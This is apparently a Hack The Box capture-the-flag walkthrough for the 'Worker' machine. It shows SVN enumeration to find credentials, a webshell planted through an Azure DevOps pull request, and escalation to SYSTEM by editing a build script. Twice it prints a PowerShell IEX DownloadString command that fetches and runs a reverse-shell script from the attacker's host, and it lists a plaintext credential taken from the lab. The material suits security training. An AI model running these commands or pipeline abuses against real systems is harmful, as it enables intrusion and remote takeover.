

# Box 



![worker](img/Screenshot_2020-12-24_16-56-03.png)

https://www.hackthebox.eu/home/machines/profile/270

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of Contents 

* [Enumeration](#enumeration)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents

## Enumeration

Let's start with nmap : 

```bash
nmap -sC -sV -oN nmap 10.10.10.203
```

![Screenshot_2020-12-23_12-24-50](img/Screenshot_2020-12-23_12-24-50.png)

We have an IIS webpage. I look for an IIS wordlist to be used with dirb.

![Screenshot_2020-12-23_14-37-11.png)](img/Screenshot_2020-12-23_14-37-11.png)

I find webpages with a 403 error but I can't do anything with those.

Let's take a look at the svn that we found on the nmap : 

![img/Screenshot_2020-12-23_14-40-50.png](img/Screenshot_2020-12-23_14-40-50.png)

I find a file moved.txt that we can read with :

```bash
svn cat svn://10.10.10.203/moved.txt
```

In this file we find out a suddomain called  http://devops.worker.htb. We have to authenticate to see the webpage.

![authenticaiton](img/Screenshot_2020-12-23_14-42-26.png)



I find an index.html webpage and there are more subdomains in it.

![file](img/Screenshot_2020-12-23_16-09-26.png) 

After visiting each website, it seems that those websites are useless. 

I got back to svn to see if I missed something so I check the logs :

```bash
svn log svn://10.10.10.203
```

We can see that there are 5 revisions : 

![deployement](img/Screenshot_2020-12-24_05-34-54.png)

There is one particulary interesting which is the one with the : "added deployment script" text, I download it :

```bash
svn export --revision r2 svn://10.10.10.203 r2
```

## Exploitation

We find credentials in a file :

![credentials](img/Screenshot_2020-12-24_05-36-51.png)

We can now authenticate to the http://devops.worker.htb webpage. 

![devops.worker.htb](img/Screenshot_2020-12-24_05-37-33.png)



We find a new repository called "SmartHotel360" but it seems that we can't do anything with it.

We can modify the code of the previous website that we visited earlier for example : http://devops.worker.htb/ekenas/SmartHotel360/_git/alpha.

![master](img/Screenshot_2020-12-24_11-14-10.png)

Make a new branch where you can upload a custom code : 

![new_branch](img/Screenshot_2020-12-24_11-15-06.png)

I upload an aspx code because I've tried with php but it doesn't work. 

You can do a pull request by approving yourself the changes and adding a new work item.

![pr](img/Screenshot_2020-12-24_11-17-17.png)



We can now build our application : 

![building](img/Screenshot_2020-12-24_11-19-34.png)

Go on the website of your choice and get to your uploaded code, mine is : http://alpha.worker.htb/cmdasp.aspx

And we have our webshell.

![webshell](img/Screenshot_2020-12-24_11-23-25.png)



Now let's get a reverse_shell thanks to our webshell  : 

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28:4446/rever_cmd.ps1')
```



Reverse_shell : 

![reverse_shell](img/Screenshot_2020-12-24_11-21-41.png)

## Post-Exploitation

### User

We are not a user yet.

I've read the logs of the builds before so I know there is a /w drive.

I find an interesting file called "passwd" :

![ls_passwd](img/Screenshot_2020-12-24_12-28-34.png)

In this file we can find a lot of credentials : 

![passwd](img/Screenshot_2020-12-24_11-48-55.png)

The only interesting line is :  `robisl = wolves11` because I found earlier that there is C:\Users\robisl\ folder in the C: drive.

Let's use the tool evil-winrm (https://github.com/Hackplayers/evil-winrm) to log in. We now have our user.txt hash.

![user](img/Screenshot_2020-12-24_12-30-45.png)

### Root

Now we can log in the website with the robinsl credential.

We have a new repository : 

![projet_robi](img/Screenshot_2020-12-24_15-40-07.png)



We have a build.ps1 file. My first attempt was to build the website without changing anything. It didn't work because dotnet is not on the machine.

I try to modify the build.ps1 file by using our previous exploit. It works perfectly and I can build my projet with the command : 

```powershell
whoami
```



![whoami](img/Screenshot_2020-12-24_15-35-59.png)



We are nt authority\system ! We can get a reverse shell by using the previous exploit and downloading a reverse_shell.

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28:4446/rever_cmd.ps1')
```

Here is my yaml file to build the project : 

![build_yaml](img/Screenshot_2020-12-24_15-48-36.png)

We got our reverse_shell and the hash. 

![reverse_admin](img/Screenshot_2020-12-24_16-06-53.png)